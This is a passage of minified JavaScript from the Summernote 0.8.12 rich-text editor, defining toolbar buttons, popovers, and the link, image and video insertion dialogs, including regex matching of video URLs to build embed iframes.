() { return i.button({ className: "note-btn-subscript", contents: i.ui.icon(i.options.icons.subscript), tooltip: i.lang.font.subscript, click: i.context.createInvokeHandlerAndUpdateState("editor.subscript") }).render() }), this.context.memo("button.fontname", function () { var t = i.context.invoke("editor.currentStyle"); return B.each(t["font-family"].split(","), function (t, e) { e = e.trim().replace(/['"]+/g, ""), i.isFontDeservedToAdd(e) && -1 === i.options.fontNames.indexOf(e) && i.options.fontNames.push(e) }), i.ui.buttonGroup([i.button({ className: "dropdown-toggle", contents: i.ui.dropdownButtonContents('<span class="note-current-fontname"/>', i.options), tooltip: i.lang.font.name, data: { toggle: "dropdown" } }), i.ui.dropdownCheck({ className: "dropdown-fontname", checkClassName: i.options.icons.menuCheck, items: i.options.fontNames.filter(i.isFontInstalled.bind(i)), title: i.lang.font.name, template: function (t) { return "<span style=\"font-family: '" + t + "'\">" + t + "</span>" }, click: i.context.createInvokeHandlerAndUpdateState("editor.fontName") })]).render() }), this.context.memo("button.fontsize", function () { return i.ui.buttonGroup([i.button({ className: "dropdown-toggle", contents: i.ui.dropdownButtonContents('<span class="note-current-fontsize"/>', i.options), tooltip: i.lang.font.size, data: { toggle: "dropdown" } }), i.ui.dropdownCheck({ className: "dropdown-fontsize", checkClassName: i.options.icons.menuCheck, items: i.options.fontSizes, title: i.lang.font.size, click: i.context.createInvokeHandlerAndUpdateState("editor.fontSize") })]).render() }), this.context.memo("button.color", function () { return i.colorPalette("note-color-all", i.lang.color.recent, !0, !0) }), this.context.memo("button.forecolor", function () { return i.colorPalette("note-color-fore", i.lang.color.foreground, !1, !0) }), this.context.memo("button.backcolor", function () { return i.colorPalette("note-color-back", i.lang.color.background, !0, !1) }), this.context.memo("button.ul", function () { return i.button({ contents: i.ui.icon(i.options.icons.unorderedlist), tooltip: i.lang.lists.unordered + i.representShortcut("insertUnorderedList"), click: i.context.createInvokeHandler("editor.insertUnorderedList") }).render() }), this.context.memo("button.ol", function () { return i.button({ contents: i.ui.icon(i.options.icons.orderedlist), tooltip: i.lang.lists.ordered + i.representShortcut("insertOrderedList"), click: i.context.createInvokeHandler("editor.insertOrderedList") }).render() }); var o = this.button({ contents: this.ui.icon(this.options.icons.alignLeft), tooltip: this.lang.paragraph.left + this.representShortcut("justifyLeft"), click: this.context.createInvokeHandler("editor.justifyLeft") }), a = this.button({ contents: this.ui.icon(this.options.icons.alignCenter), tooltip: this.lang.paragraph.center + this.representShortcut("justifyCenter"), click: this.context.createInvokeHandler("editor.justifyCenter") }), s = this.button({ contents: this.ui.icon(this.options.icons.alignRight), tooltip: this.lang.paragraph.right + this.representShortcut("justifyRight"), click: this.context.createInvokeHandler("editor.justifyRight") }), r = this.button({ contents: this.ui.icon(this.options.icons.alignJustify), tooltip: this.lang.paragraph.justify + this.representShortcut("justifyFull"), click: this.context.createInvokeHandler("editor.justifyFull") }), g = this.button({ contents: this.ui.icon(this.options.icons.outdent), tooltip: this.lang.paragraph.outdent + this.representShortcut("outdent"), click: this.context.createInvokeHandler("editor.outdent") }), l = this.button({ contents: this.ui.icon(this.options.icons.indent), tooltip: this.lang.paragraph.indent + this.representShortcut("indent"), click: this.context.createInvokeHandler("editor.indent") }); this.context.memo("button.justifyLeft", D.invoke(o, "render")), this.context.memo("button.justifyCenter", D.invoke(a, "render")), this.context.memo("button.justifyRight", D.invoke(s, "render")), this.context.memo("button.justifyFull", D.invoke(r, "render")), this.context.memo("button.outdent", D.invoke(g, "render")), this.context.memo("button.indent", D.invoke(l, "render")), this.context.memo("button.paragraph", function () { return i.ui.buttonGroup([i.button({ className: "dropdown-toggle", contents: i.ui.dropdownButtonContents(i.ui.icon(i.options.icons.alignLeft), i.options), tooltip: i.lang.paragraph.paragraph, data: { toggle: "dropdown" } }), i.ui.dropdown([i.ui.buttonGroup({ className: "note-align", children: [o, a, s, r] }), i.ui.buttonGroup({ className: "note-list", children: [g, l] })])]).render() }), this.context.memo("button.height", function () { return i.ui.buttonGroup([i.button({ className: "dropdown-toggle", contents: i.ui.dropdownButtonContents(i.ui.icon(i.options.icons.textHeight), i.options), tooltip: i.lang.font.height, data: { toggle: "dropdown" } }), i.ui.dropdownCheck({ items: i.options.lineHeights, checkClassName: i.options.icons.menuCheck, className: "dropdown-line-height", title: i.lang.font.height, click: i.context.createInvokeHandler("editor.lineHeight") })]).render() }), this.context.memo("button.table", function () { return i.ui.buttonGroup([i.button({ className: "dropdown-toggle", contents: i.ui.dropdownButtonContents(i.ui.icon(i.options.icons.table), i.options), tooltip: i.lang.table.table, data: { toggle: "dropdown" } }), i.ui.dropdown({ title: i.lang.table.table, className: "note-table", items: ['<div class="note-dimension-picker">', '  <div class="note-dimension-picker-mousecatcher" data-event="insertTable" data-value="1x1"/>', '  <div class="note-dimension-picker-highlighted"/>', '  <div class="note-dimension-picker-unhighlighted"/>', "</div>", '<div class="note-dimension-display">1 x 1</div>'].join("") })], { callback: function (t) { t.find(".note-dimension-picker-mousecatcher").css({ width: i.options.insertTableMaxSize.col + "em", height: i.options.insertTableMaxSize.row + "em" }).mousedown(i.context.createInvokeHandler("editor.insertTable")).on("mousemove", i.tableMoveHandler.bind(i)) } }).render() }), this.context.memo("button.link", function () { return i.button({ contents: i.ui.icon(i.options.icons.link), tooltip: i.lang.link.link + i.representShortcut("linkDialog.show"), click: i.context.createInvokeHandler("linkDialog.show") }).render() }), this.context.memo("button.picture", function () { return i.button({ contents: i.ui.icon(i.options.icons.picture), tooltip: i.lang.image.image, click: i.context.createInvokeHandler("imageDialog.show") }).render() }), this.context.memo("button.video", function () { return i.button({ contents: i.ui.icon(i.options.icons.video), tooltip: i.lang.video.video, click: i.context.createInvokeHandler("videoDialog.show") }).render() }), this.context.memo("button.hr", function () { return i.button({ contents: i.ui.icon(i.options.icons.minus), tooltip: i.lang.hr.insert + i.representShortcut("insertHorizontalRule"), click: i.context.createInvokeHandler("editor.insertHorizontalRule") }).render() }), this.context.memo("button.fullscreen", function () { return i.button({ className: "btn-fullscreen", contents: i.ui.icon(i.options.icons.arrowsAlt), tooltip: i.lang.options.fullscreen, click: i.context.createInvokeHandler("fullscreen.toggle") }).render() }), this.context.memo("button.codeview", function () { return i.button({ className: "btn-codeview", contents: i.ui.icon(i.options.icons.code), tooltip: i.lang.options.codeview, click: i.context.createInvokeHandler("codeview.toggle") }).render() }), this.context.memo("button.redo", function () { return i.button({ contents: i.ui.icon(i.options.icons.redo), tooltip: i.lang.history.redo + i.representShortcut("redo"), click: i.context.createInvokeHandler("editor.redo") }).render() }), this.context.memo("button.undo", function () { return i.button({ contents: i.ui.icon(i.options.icons.undo), tooltip: i.lang.history.undo + i.representShortcut("undo"), click: i.context.createInvokeHandler("editor.undo") }).render() }), this.context.memo("button.help", function () { return i.button({ contents: i.ui.icon(i.options.icons.question), tooltip: i.lang.options.help, click: i.context.createInvokeHandler("helpDialog.show") }).render() }) }, be.prototype.addImagePopoverButtons = function () { var t = this; this.context.memo("button.resizeFull", function () { return t.button({ contents: '<span class="note-fontsize-10">100%</span>', tooltip: t.lang.image.resizeFull, click: t.context.createInvokeHandler("editor.resize", "1") }).render() }), this.context.memo("button.resizeHalf", function () { return t.button({ contents: '<span class="note-fontsize-10">50%</span>', tooltip: t.lang.image.resizeHalf, click: t.context.createInvokeHandler("editor.resize", "0.5") }).render() }), this.context.memo("button.resizeQuarter", function () { return t.button({ contents: '<span class="note-fontsize-10">25%</span>', tooltip: t.lang.image.resizeQuarter, click: t.context.createInvokeHandler("editor.resize", "0.25") }).render() }), this.context.memo("button.resizeNone", function () { return t.button({ contents: t.ui.icon(t.options.icons.rollback), tooltip: t.lang.image.resizeNone, click: t.context.createInvokeHandler("editor.resize", "0") }).render() }), this.context.memo("button.floatLeft", function () { return t.button({ contents: t.ui.icon(t.options.icons.floatLeft), tooltip: t.lang.image.floatLeft, click: t.context.createInvokeHandler("editor.floatMe", "left") }).render() }), this.context.memo("button.floatRight", function () { return t.button({ contents: t.ui.icon(t.options.icons.floatRight), tooltip: t.lang.image.floatRight, click: t.context.createInvokeHandler("editor.floatMe", "right") }).render() }), this.context.memo("button.floatNone", function () { return t.button({ contents: t.ui.icon(t.options.icons.rollback), tooltip: t.lang.image.floatNone, click: t.context.createInvokeHandler("editor.floatMe", "none") }).render() }), this.context.memo("button.removeMedia", function () { return t.button({ contents: t.ui.icon(t.options.icons.trash), tooltip: t.lang.image.remove, click: t.context.createInvokeHandler("editor.removeMedia") }).render() }) }, be.prototype.addLinkPopoverButtons = function () { var t = this; this.context.memo("button.linkDialogShow", function () { return t.button({ contents: t.ui.icon(t.options.icons.link), tooltip: t.lang.link.edit, click: t.context.createInvokeHandler("linkDialog.show") }).render() }), this.context.memo("button.unlink", function () { return t.button({ contents: t.ui.icon(t.options.icons.unlink), tooltip: t.lang.link.unlink, click: t.context.createInvokeHandler("editor.unlink") }).render() }) }, be.prototype.addTablePopoverButtons = function () { var t = this; this.context.memo("button.addRowUp", function () { return t.button({ className: "btn-md", contents: t.ui.icon(t.options.icons.rowAbove), tooltip: t.lang.table.addRowAbove, click: t.context.createInvokeHandler("editor.addRow", "top") }).render() }), this.context.memo("button.addRowDown", function () { return t.button({ className: "btn-md", contents: t.ui.icon(t.options.icons.rowBelow), tooltip: t.lang.table.addRowBelow, click: t.context.createInvokeHandler("editor.addRow", "bottom") }).render() }), this.context.memo("button.addColLeft", function () { return t.button({ className: "btn-md", contents: t.ui.icon(t.options.icons.colBefore), tooltip: t.lang.table.addColLeft, click: t.context.createInvokeHandler("editor.addCol", "left") }).render() }), this.context.memo("button.addColRight", function () { return t.button({ className: "btn-md", contents: t.ui.icon(t.options.icons.colAfter), tooltip: t.lang.table.addColRight, click: t.context.createInvokeHandler("editor.addCol", "right") }).render() }), this.context.memo("button.deleteRow", function () { return t.button({ className: "btn-md", contents: t.ui.icon(t.options.icons.rowRemove), tooltip: t.lang.table.delRow, click: t.context.createInvokeHandler("editor.deleteRow") }).render() }), this.context.memo("button.deleteCol", function () { return t.button({ className: "btn-md", contents: t.ui.icon(t.options.icons.colRemove), tooltip: t.lang.table.delCol, click: t.context.createInvokeHandler("editor.deleteCol") }).render() }), this.context.memo("button.deleteTable", function () { return t.button({ className: "btn-md", contents: t.ui.icon(t.options.icons.trash), tooltip: t.lang.table.delTable, click: t.context.createInvokeHandler("editor.deleteTable") }).render() }) }, be.prototype.build = function (t, e) { for (var n = 0, i = e.length; n < i; n++) { for (var o = e[n], a = Array.isArray(o) ? o[0] : o, s = Array.isArray(o) ? 1 === o.length ? [o[0]] : o[1] : [o], r = this.ui.buttonGroup({ className: "note-" + a }).render(), g = 0, l = s.length; g < l; g++) { var c = this.context.memo("button." + s[g]); c && r.append("function" == typeof c ? c() : c) } r.appendTo(t) } }, be.prototype.updateCurrentStyle = function (t) { var e, o, a, i, s = this, n = t || this.$toolbar, r = this.context.invoke("editor.currentStyle"); this.updateBtnStates(n, { ".note-btn-bold": function () { return "bold" === r["font-bold"] }, ".note-btn-italic": function () { return "italic" === r["font-italic"] }, ".note-btn-underline": function () { return "underline" === r["font-underline"] }, ".note-btn-subscript": function () { return "subscript" === r["font-subscript"] }, ".note-btn-superscript": function () { return "superscript" === r["font-superscript"] }, ".note-btn-strikethrough": function () { return "strikethrough" === r["font-strikethrough"] } }), r["font-family"] && (e = r["font-family"].split(",").map(function (t) { return t.replace(/[\'\"]/g, "").replace(/\s+$/, "").replace(/^\s+/, "") }), o = T.find(e, this.isFontInstalled.bind(this)), n.find(".dropdown-fontname a").each(function (t, e) { var n = B(e), i = n.data("value") + "" == o + ""; n.toggleClass("checked", i) }), n.find(".note-current-fontname").text(o).css("font-family", o)), r["font-size"] && (a = r["font-size"], n.find(".dropdown-fontsize a").each(function (t, e) { var n = B(e), i = n.data("value") + "" == a + ""; n.toggleClass("checked", i) }), n.find(".note-current-fontsize").text(a)), r["line-height"] && (i = r["line-height"], n.find(".dropdown-line-height li a").each(function (t, e) { var n = B(e).data("value") + "" == i + ""; s.className = n ? "checked" : "" })) }, be.prototype.updateBtnStates = function (n, t) { var i = this; B.each(t, function (t, e) { i.ui.toggleBtnActive(n.find(t), e()) }) }, be.prototype.tableMoveHandler = function (t) { var e, n, i = B(t.target.parentNode), o = i.next(), a = i.find(".note-dimension-picker-mousecatcher"), s = i.find(".note-dimension-picker-highlighted"), r = i.find(".note-dimension-picker-unhighlighted"); n = void 0 === t.offsetX ? (e = B(t.target).offset(), { x: t.pageX - e.left, y: t.pageY - e.top }) : { x: t.offsetX, y: t.offsetY }; var g = Math.ceil(n.x / 18) || 1, l = Math.ceil(n.y / 18) || 1; s.css({ width: g + "em", height: l + "em" }), a.data("value", g + "x" + l), 3 < g && g < this.options.insertTableMaxSize.col && r.css({ width: g + 1 + "em" }), 3 < l && l < this.options.insertTableMaxSize.row && r.css({ height: l + 1 + "em" }), o.html(g + " x " + l) }, be); function be(t) { this.ui = B.summernote.ui, this.context = t, this.$toolbar = t.layoutInfo.toolbar, this.options = t.options, this.lang = this.options.langInfo, this.invertedKeyMap = D.invertObject(this.options.keyMap[S.isMac ? "mac" : "pc"]) } var Be = (ye.prototype.shouldInitialize = function () { return !this.options.airMode }, ye.prototype.initialize = function () { var t = this; this.options.toolbar = this.options.toolbar || [], this.options.toolbar.length ? this.context.invoke("buttons.build", this.$toolbar, this.options.toolbar) : this.$toolbar.hide(), this.options.toolbarContainer && this.$toolbar.appendTo(this.options.toolbarContainer), this.changeContainer(!1), this.$note.on("summernote.keyup summernote.mouseup summernote.change", function () { t.context.invoke("buttons.updateCurrentStyle") }), this.context.invoke("buttons.updateCurrentStyle"), this.options.followingToolbar && this.$window.on("scroll resize", this.followScroll) }, ye.prototype.destroy = function () { this.$toolbar.children().remove(), this.options.followingToolbar && this.$window.off("scroll resize", this.followScroll) }, ye.prototype.followScroll = function () { if (this.$editor.hasClass("fullscreen")) return !1; var t = this.$editor.outerHeight(), e = this.$editor.width(), n = this.$toolbar.height(), i = this.$statusbar.height(), o = 0; this.options.otherStaticBar && (o = B(this.options.otherStaticBar).outerHeight()); var a = this.$document.scrollTop(), s = this.$editor.offset().top, r = s - o, g = s + t - o - n - i; !this.isFollowing && r < a && a < g - n ? (this.isFollowing = !0, this.$toolbar.css({ position: "fixed", top: o, width: e }), this.$editable.css({ marginTop: this.$toolbar.height() + 5 })) : this.isFollowing && (a < r || g < a) && (this.isFollowing = !1, this.$toolbar.css({ position: "relative", top: 0, width: "100%" }), this.$editable.css({ marginTop: "" })) }, ye.prototype.changeContainer = function (t) { t ? this.$toolbar.prependTo(this.$editor) : this.options.toolbarContainer && this.$toolbar.appendTo(this.options.toolbarContainer), this.followScroll() }, ye.prototype.updateFullscreen = function (t) { this.ui.toggleBtnActive(this.$toolbar.find(".btn-fullscreen"), t), this.changeContainer(t) }, ye.prototype.updateCodeview = function (t) { this.ui.toggleBtnActive(this.$toolbar.find(".btn-codeview"), t), t ? this.deactivate() : this.activate() }, ye.prototype.activate = function (t) { var e = this.$toolbar.find("button"); t || (e = e.not(".btn-codeview")), this.ui.toggleBtn(e, !0) }, ye.prototype.deactivate = function (t) { var e = this.$toolbar.find("button"); t || (e = e.not(".btn-codeview")), this.ui.toggleBtn(e, !1) }, ye); function ye(t) { this.context = t, this.$window = B(window), this.$document = B(document), this.ui = B.summernote.ui, this.$note = t.layoutInfo.note, this.$editor = t.layoutInfo.editor, this.$toolbar = t.layoutInfo.toolbar, this.$editable = t.layoutInfo.editable, this.$statusbar = t.layoutInfo.statusbar, this.options = t.options, this.isFollowing = !1, this.followScroll = this.followScroll.bind(this) } var ve = (xe.prototype.initialize = function () { var t = this.options.dialogsInBody ? this.$body : this.$editor, e = ['<div class="form-group note-form-group">', '<label class="note-form-label">' + this.lang.link.textToDisplay + "</label>", '<input class="note-link-text form-control note-form-control note-input" type="text" />', "</div>", '<div class="form-group note-form-group">', '<label class="note-form-label">' + this.lang.link.url + "</label>", '<input class="note-link-url form-control note-form-control note-input" type="text" value="https://" />', "</div>", this.options.disableLinkTarget ? "" : B("<div/>").append(this.ui.checkbox({ className: "sn-checkbox-open-in-new-window", text: this.lang.link.openInNewWindow, checked: !0 }).render()).html()].join(""), n = '<input type="button" href="#" class="btn btn-primary note-btn note-btn-primary note-link-btn" value="' + this.lang.link.insert + '" disabled>'; this.$dialog = this.ui.dialog({ className: "link-dialog", title: this.lang.link.insert, fade: this.options.dialogsFade, body: e, footer: n }).render().appendTo(t) }, xe.prototype.destroy = function () { this.ui.hideDialog(this.$dialog), this.$dialog.remove() }, xe.prototype.bindEnterKey = function (t, e) { t.on("keypress", function (t) { t.keyCode === Tt.code.ENTER && (t.preventDefault(), e.trigger("click")) }) }, xe.prototype.toggleLinkBtn = function (t, e, n) { this.ui.toggleBtn(t, e.val() && n.val()) }, xe.prototype.showLinkDialog = function (s) { var r = this; return B.Deferred(function (e) { var n = r.$dialog.find(".note-link-text"), i = r.$dialog.find(".note-link-url"), o = r.$dialog.find(".note-link-btn"), a = r.$dialog.find(".sn-checkbox-open-in-new-window input[type=checkbox]"); r.ui.onDialogShown(r.$dialog, function () { r.context.triggerEvent("dialog.shown"), !s.url && D.isValidUrl(s.text) && (s.url = s.text), n.on("input paste propertychange", function () { s.text = n.val(), r.toggleLinkBtn(o, n, i) }).val(s.text), i.on("input paste propertychange", function () { s.text || n.val(i.val()), r.toggleLinkBtn(o, n, i) }).val(s.url), S.isSupportTouch || i.trigger("focus"), r.toggleLinkBtn(o, n, i), r.bindEnterKey(i, o), r.bindEnterKey(n, o); var t = void 0 !== s.isNewWindow ? s.isNewWindow : r.context.options.linkTargetBlank; a.prop("checked", t), o.one("click", function (t) { t.preventDefault(), e.resolve({ range: s.range, url: i.val(), text: n.val(), isNewWindow: a.is(":checked") }), r.ui.hideDialog(r.$dialog) }) }), r.ui.onDialogHidden(r.$dialog, function () { n.off(), i.off(), o.off(), "pending" === e.state() && e.reject() }), r.ui.showDialog(r.$dialog) }).promise() }, xe.prototype.show = function () { var e = this, t = this.context.invoke("editor.getLinkInfo"); this.context.invoke("editor.saveRange"), this.showLinkDialog(t).then(function (t) { e.context.invoke("editor.restoreRange"), e.context.invoke("editor.createLink", t) }).fail(function () { e.context.invoke("editor.restoreRange") }) }, xe); function xe(t) { this.context = t, this.ui = B.summernote.ui, this.$body = B(document.body), this.$editor = t.layoutInfo.editor, this.options = t.options, this.lang = this.options.langInfo, t.memo("help.linkDialog.show", this.options.langInfo.help["linkDialog.show"]) } var Fe = (Qe.prototype.shouldInitialize = function () { return !T.isEmpty(this.options.popover.link) }, Qe.prototype.initialize = function () { this.$popover = this.ui.popover({ className: "note-link-popover", callback: function (t) { t.find(".popover-content,.note-popover-content").prepend('<span><a target="_blank"></a>&nbsp;</span>') } }).render().appendTo(this.options.container); var t = this.$popover.find(".popover-content,.note-popover-content"); this.context.invoke("buttons.build", t, this.options.popover.link) }, Qe.prototype.destroy = function () { this.$popover.remove() }, Qe.prototype.update = function () { var t, e, n, i; this.context.invoke("editor.hasFocus") && (t = this.context.invoke("editor.getLastRange")).isCollapsed() && t.isOnAnchor() ? (e = wt.ancestor(t.sc, wt.isAnchor), n = B(e).attr("href"), this.$popover.find("a").attr("href", n).html(n), i = wt.posFromPlaceholder(e), this.$popover.css({ display: "block", left: i.left, top: i.top })) : this.hide() }, Qe.prototype.hide = function () { this.$popover.hide() }, Qe); function Qe(t) { var e = this; this.context = t, this.ui = B.summernote.ui, this.options = t.options, this.events = { "summernote.keyup summernote.mouseup summernote.change summernote.scroll": function () { e.update() }, "summernote.disable summernote.dialog.shown": function () { e.hide() } } } var Ge = (we.prototype.initialize = function () { var t, e, n = this.options.dialogsInBody ? this.$body : this.$editor, i = ""; this.options.maximumImageFileSize && (t = Math.floor(Math.log(this.options.maximumImageFileSize) / Math.log(1024)), e = +(this.options.maximumImageFileSize / Math.pow(1024, t)).toFixed(2) + " " + " KMGTP"[t] + "B", i = "<small>" + this.lang.image.maximumFileSize + " : " + e + "</small>"); var o = ['<div class="form-group note-form-group note-group-select-from-files">', '<label class="note-form-label">' + this.lang.image.selectFromFiles + "</label>", '<input class="note-image-input form-control-file note-form-control note-input" ', ' type="file" name="files" accept="image/*" multiple="multiple" />', i, "</div>", '<div class="form-group note-group-image-url" style="overflow:auto;">', '<label class="note-form-label">' + this.lang.image.url + "</label>", '<input class="note-image-url form-control note-form-control note-input ', ' col-md-12" type="text" />', "</div>"].join(""), a = '<input type="button" href="#" class="btn btn-primary note-btn note-btn-primary note-image-btn" value="' + this.lang.image.insert + '" disabled>'; this.$dialog = this.ui.dialog({ title: this.lang.image.insert, fade: this.options.dialogsFade, body: o, footer: a }).render().appendTo(n) }, we.prototype.destroy = function () { this.ui.hideDialog(this.$dialog), this.$dialog.remove() }, we.prototype.bindEnterKey = function (t, e) { t.on("keypress", function (t) { t.keyCode === Tt.code.ENTER && (t.preventDefault(), e.trigger("click")) }) }, we.prototype.show = function () { var e = this; this.context.invoke("editor.saveRange"), this.showImageDialog().then(function (t) { e.ui.hideDialog(e.$dialog), e.context.invoke("editor.restoreRange"), "string" == typeof t ? e.options.callbacks.onImageLinkInsert ? e.context.triggerEvent("image.link.insert", t) : e.context.invoke("editor.insertImage", t) : e.context.invoke("editor.insertImagesOrCallback", t) }).fail(function () { e.context.invoke("editor.restoreRange") }) }, we.prototype.showImageDialog = function () { var o = this; return B.Deferred(function (e) { var t = o.$dialog.find(".note-image-input"), n = o.$dialog.find(".note-image-url"), i = o.$dialog.find(".note-image-btn"); o.ui.onDialogShown(o.$dialog, function () { o.context.triggerEvent("dialog.shown"), t.replaceWith(t.clone().on("change", function (t) { e.resolve(t.target.files || t.target.value) }).val("")), n.on("input paste propertychange", function () { o.ui.toggleBtn(i, n.val()) }).val(""), S.isSupportTouch || n.trigger("focus"), i.click(function (t) { t.preventDefault(), e.resolve(n.val()) }), o.bindEnterKey(n, i) }), o.ui.onDialogHidden(o.$dialog, function () { t.off(), n.off(), i.off(), "pending" === e.state() && e.reject() }), o.ui.showDialog(o.$dialog) }) }, we); function we(t) { this.context = t, this.ui = B.summernote.ui, this.$body = B(document.body), this.$editor = t.layoutInfo.editor, this.options = t.options, this.lang = this.options.langInfo } var Xe = (Se.prototype.shouldInitialize = function () { return !T.isEmpty(this.options.popover.image) }, Se.prototype.initialize = function () { this.$popover = this.ui.popover({ className: "note-image-popover" }).render().appendTo(this.options.container); var t = this.$popover.find(".popover-content,.note-popover-content"); this.context.invoke("buttons.build", t, this.options.popover.image) }, Se.prototype.destroy = function () { this.$popover.remove() }, Se.prototype.update = function (t, e) { var n, i; wt.isImg(t) ? (n = wt.posFromPlaceholder(t), i = wt.posFromPlaceholder(this.editable), this.$popover.css({ display: "block", left: this.options.popatmouse ? e.pageX - 20 : n.left, top: this.options.popatmouse ? e.pageY : Math.min(n.top, i.top) })) : this.hide() }, Se.prototype.hide = function () { this.$popover.hide() }, Se); function Se(t) { var e = this; this.context = t, this.ui = B.summernote.ui, this.editable = t.layoutInfo.editable[0], this.options = t.options, this.events = { "summernote.disable": function () { e.hide() } } } var ke = (De.prototype.shouldInitialize = function () { return !T.isEmpty(this.options.popover.table) }, De.prototype.initialize = function () { this.$popover = this.ui.popover({ className: "note-table-popover" }).render().appendTo(this.options.container); var t = this.$popover.find(".popover-content,.note-popover-content"); this.context.invoke("buttons.build", t, this.options.popover.table), S.isFF && document.execCommand("enableInlineTableEditing", !1, !1) }, De.prototype.destroy = function () { this.$popover.remove() }, De.prototype.update = function (t) { if (this.context.isDisabled()) return !1; var e, n = wt.isCell(t); return n ? (e = wt.posFromPlaceholder(t), this.$popover.css({ display: "block", left: e.left, top: e.top })) : this.hide(), n }, De.prototype.hide = function () { this.$popover.hide() }, De); function De(t) { var n = this; this.context = t, this.ui = B.summernote.ui, this.options = t.options, this.events = { "summernote.mousedown": function (t, e) { n.update(e.target) }, "summernote.keyup summernote.scroll summernote.change": function () { n.update() }, "summernote.disable": function () { n.hide() } } } var Ze = (Ue.prototype.initialize = function () { var t = this.options.dialogsInBody ? this.$body : this.$editor, e = ['<div class="form-group note-form-group row-fluid">', '<label class="note-form-label">' + this.lang.video.url + ' <small class="text-muted">' + this.lang.video.providers + "</small></label>", '<input class="note-video-url form-control note-form-control note-input" type="text" />', "</div>"].join(""), n = '<input type="button" href="#" class="btn btn-primary note-btn note-btn-primary note-video-btn" value="' + this.lang.video.insert + '" disabled>'; this.$dialog = this.ui.dialog({ title: this.lang.video.insert, fade: this.options.dialogsFade, body: e, footer: n }).render().appendTo(t) }, Ue.prototype.destroy = function () { this.ui.hideDialog(this.$dialog), this.$dialog.remove() }, Ue.prototype.bindEnterKey = function (t, e) { t.on("keypress", function (t) { t.keyCode === Tt.code.ENTER && (t.preventDefault(), e.trigger("click")) }) }, Ue.prototype.createVideoNode = function (t) { var e = t.match(/\/\/(?:www\.)?(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=))([\w|-]{11})(?:(?:[\?&]t=)(\S+))?$/), n = t.match(/(?:www\.|\/\/)instagram\.com\/p\/(.[a-zA-Z0-9_-]*)/), i = t.match(/\/\/vine\.co\/v\/([a-zA-Z0-9]+)/), o = t.match(/\/\/(player\.)?vimeo\.com\/([a-z]*\/)*(\d+)[?]?.*/), a = t.match(/.+dailymotion.com\/(video|hub)\/([^_]+)[^#]*(#video=([^_&]+))?/), s = t.match(/\/\/v\.youku\.com\/v_show\/id_(\w+)=*\.html/), r = t.match(/\/\/v\.qq\.com.*?vid=(.+)/), g = t.match(/\/\/v\.qq\.com\/x?\/?(page|cover).*?\/([^\/]+)\.html\??.*/), l = t.match(/^.+.(mp4|m4v)$/), c = t.match(/^.+.(ogg|ogv)$/), I = t.match(/^.+.(webm)$/), u = t.match(/(?:www\.|\/\/)facebook\.com\/([^\/]+)\/videos\/([0-9]+)/); if (e && 11 === e[1].length) { var h = e[1], d = 0; if (void 0 !== e[2]) { var C = e[2].match(/^(?:(\d+)h)?(?:(\d+)m)?(?:(\d+)s)?$/); if (C) for (var A = [3600, 60, 1], p = 0, m = A.length; p < m; p++)d += void 0 !== C[p + 1] ? A[p] * parseInt(C[p + 1], 10) : 0 } b = B("<iframe>").attr("frameborder", 0).attr("src", "//www.youtube.com/embed/" + h + (0 < d ? "?start=" + d : "")).attr("width", "640").attr("height", "360") } else if (n && n[0].length) b = B("<iframe>").attr("frameborder", 0).attr("src", "https://instagram.com/p/" + n[1] + "/embed/").attr("width", "612").attr("height", "710").attr("scrolling", "no").attr("allowtransparency", "true"); else if (i && i[0].length) b = B("<iframe>").attr("frameborder", 0).attr("src", i[0] + "/embed/simple").attr("width", "600").attr("height", "600").attr("class", "vine-embed"); else if (o && o[3].length) b = B("<iframe webkitallowfullscreen mozallowfullscreen allowfullscreen>").attr("frameborder", 0).attr("src", "//player.vimeo.com/video/" + o[3]).attr("width", "640").attr("height", "360"); else if (a && a[2].length) b = B("<iframe>").attr("frameborder", 0).attr("src", "//www.dailymotion.com/embed/video/" + a[2]).attr("width", "640").attr("height", "360"); else if (s && s[1].length) b = B("<iframe webkitallowfullscreen mozallowfullscreen allowfullscreen>").attr("frameborder", 0).attr("height", "498").attr("width", "510").attr("src", "//player.youku.com/embed/" + s[1]); else if (r && r[1].length || g && g[2].length) var f = r && r[1].length ? r[1] : g[2], b = B("<iframe webkitallowfullscreen mozallowfullscreen allowfullscreen>").attr("frameborder", 0).attr("height", "310").attr("width", "500").attr("src", "https://v.qq.com/iframe/player.html?vid=" + f + "&amp;auto=0"); else if (l || c || I) b = B("<video controls>").attr("src", t).attr("width", "640").attr("height", "360"); else { if (!u || !u[0].length) return !1; b = B("<iframe>").attr("frameborder", 0).attr("src", "https://www.facebook.com/plugins/video.php?href=" + encodeURIComponent(u[0]) + "&show_text=0&width=560").attr("width", "560").attr("height", "301").attr("scrolling", "no").attr("allowtransparency", "true") } return b.addClass("note-video-clip"), b[0] }, Ue.prototype.show = function () { var n = this, t = this.context.invoke("editor.getSelectedText"); this.context.invoke("editor.saveRange"), this.showVideoDialog(t).then(function (t) { n.ui.hideDialog(n.$dialog), n.context.invoke("editor.restoreRange"); var e = n.createVideoNode(t); e && n.context.invoke("editor.insertNode", e) }).fail(function () { n.context.invoke("editor.restoreRange") }) }, Ue.prototype.showVideoDialog = function (t) { var i = this; return B.Deferred(function (e) { var n = i.$dialog.find(".note-video-url"), t = i.$dialog.find(".note-video-btn"); i.ui.onDialogShown(i.$dialog, function () { i.context.triggerEvent("dialog.shown"), n.on("input paste propertychange", function () { i.ui.toggleBtn(t, n.val()) }), S.isSupportTouch || n.trigger("focus"), t.click(function (t) { t.preventDefault(), e.resolve(n.val()) }), i.bindEnterKey(n, t) }), i.ui.onDialogHidden(i.$dialog, function () { n.off(), t.off(), "pending" === e.state() && e.reject() }), i.ui.showDialog(i.$dialog) }) }, Ue); function Ue(t) { this.context = t, this.ui = B.summernote.ui, this.$body = B(document.body), this.$editor = t.layoutInfo.editor, this.options = t.options, this.lang = this.options.langInfo } var We = (Ne.prototype.initialize = function () { var t = this.options.dialogsInBody ? this.$body : this.$editor, e = ['<p class="text-center">', '<a href="https://summernote.org/" target="_blank">Summernote 0.8.12</a> Â· ', '<a href="https://github.com/summernote/summernote" target="_blank">Project</a> Â· ', '<a href="https://github.com/summernote/summernote/issues" target="_blank">Issues</a>', "</p>"].join(""); this.$dialog = this.ui.dialog({ title: this.lang.options.help, fade: this.options.dialogsFade, body: this.createShortcutList(), footer: e, callback: function (t) { t.find(".modal-body,.note-modal-body").css({ "max-height": 300, overflow: "scroll" }) } }).render().appendTo(t) }, Ne.prototype.destroy = function () { this.ui.hideDialog(this.$dialog), this.$dialog.remove() }, Ne.prototype.createShortcutList = function () { var i = this, o = 